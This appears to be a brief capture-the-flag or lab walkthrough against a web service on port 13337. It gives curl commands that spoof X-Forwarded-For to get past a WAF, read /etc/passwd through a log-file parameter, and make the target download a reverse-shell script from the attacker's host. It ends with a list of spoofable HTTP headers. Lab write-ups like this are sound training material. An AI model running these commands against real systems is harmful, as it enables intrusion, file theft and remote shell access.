we find a port 13337
upon visiting, it shows the usage
```http
/version
Methods: GET
Returns version of the app running.

/update
Methods: POST
Updates the app using a linux executable. Content-Type: application/json {"user":"<user requesting the update>", "url":"<url of the update to download>"}

/logs
Methods: GET
Read log files.

/restart
Methods: GET
To request the restart of the app.
```

```zsh
#we start with /logs
curl http://192.168.132.134:13337/logs
#-->WAF: Access Denied for this Host.

#to bypass this, we can set a header -H "X-Forwarded-For:localhost"
#It is called a HTTP header attack
curl http://192.168.132.134:13337/logs -H "X-Forwarded-For:localhost"
#-->Error! No file specified. Use file=/path/to/log/file to access log files.

#means, now we can hopefully specify any file as ?file=, and we can view it
curl http://192.168.132.134:13337/logs?file=/etc/passwd -H "X-Forwarded-For:localhost"
#-->gets us /etc/passwd, and a username clumsyadmin
#we can try to see if they have an .ssh/id_rsa
#we dont find it. But we can now use the username to perform the POST /update
```


```zsh
Curl post request
curl -X POST http://192.168.132.134:13337/update -H "Content-Type: application/json" --data '{"user":"clumsyadmin","url":"http://192.168.45.160/rshell.sh"}'
#tried rshell.sh" | bash --> did not work
#so, 
curl http://192.168.132.134:13337/restart
#-->snip
#function restart(){
#	if(confirm("Do you really want to restart the app?")){
#		var x = new XMLHttpRequest();
#		x.open("POST", document.URL.toString());
#		x.send('{"confirm":"true"}');
#snip
#looks like we need to send a POST req with confirm = true
curl -X POST http://192.168.132.134:13337/restart --data '{"confirm":"true"}'

#from there it is just SUID for wget, and GTFO to root!
```

---
---
---
HTTP header attack
# HTTP Headers for exploit  
Host  
X-Forwarded-Host  
X-Forwarded-For  
X-Host  
X-Forwarded-Server  
X-HTTP-Host-Override  
Forwarded